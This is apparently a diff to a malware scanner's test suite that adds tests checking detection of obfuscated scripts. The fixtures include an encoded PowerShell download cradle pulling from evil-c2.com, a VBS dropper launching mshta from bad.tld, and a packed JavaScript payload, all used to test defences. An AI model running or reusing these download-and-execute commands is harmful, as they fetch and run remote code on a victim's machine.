@@ -208,3 +208,39 @@ def test_eicar_detected(tmp_path):
     eicar = (rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
              rb"$H+H*")
     assert _scan(tmp_path, "eicar.com", eicar).verdict >= Verdict.LIKELY_MALICIOUS
+
+
+def test_powershell_encoded_cradle_decoded(tmp_path):
+    # PowerShell -EncodedCommand (UTF-16LE base64) hiding a download cradle must
+    # be decoded, the behaviour chain reported, and the C2 URL recovered.
+    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.com/a.ps1')"
+    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
+    r = _scan(tmp_path, "a.ps1", f"powershell -nop -w hidden -enc {enc}".encode())
+    assert r.verdict >= Verdict.LIKELY_MALICIOUS
+    chain = [f for f in r.findings if f.title == "Malicious script behaviour chain"]
+    assert chain and "evil-c2.com/a.ps1" in chain[0].data.get("urls", [None])[0]
+    assert "T1059.001" in chain[0].data.get("attack", [])
+
+
+def test_vbs_wscript_dropper_chain(tmp_path):
+    js = b'Set s=CreateObject("WScript.Shell"):s.Run "mshta http://bad.tld/x.hta"'
+    r = _scan(tmp_path, "b.vbs", js)
+    titles = [f.title for f in r.findings]
+    assert "WScript.Shell command execution" in titles
+    assert any("mshta" in t for t in titles)
+
+
+def test_benign_script_no_behaviour_chain(tmp_path):
+    benign = b"# build helper\nfunction add($a,$b){ return $a + $b }\nWrite-Host (add 1 2)\n"
+    r = _scan(tmp_path, "ok.ps1", benign)
+    assert not any(f.title == "Malicious script behaviour chain" for f in r.findings)
+    assert r.verdict < Verdict.SUSPICIOUS
+
+
+def test_eval_packer_unrolled(tmp_path):
+    packed = ("eval(function(p,a,c,k,e,d){return p}('var u=\"0\";iex(u)',"
+              "16,1,'http://evil-c2.com/gate'.split('|'),0,{}))")
+    r = _scan(tmp_path, "p.js", packed.encode())
+    assert r.verdict >= Verdict.SUSPICIOUS
+    iocs = [i for f in r.findings for i in f.data.get("urls", [])]
+    assert any("evil-c2.com/gate" in i for i in iocs)
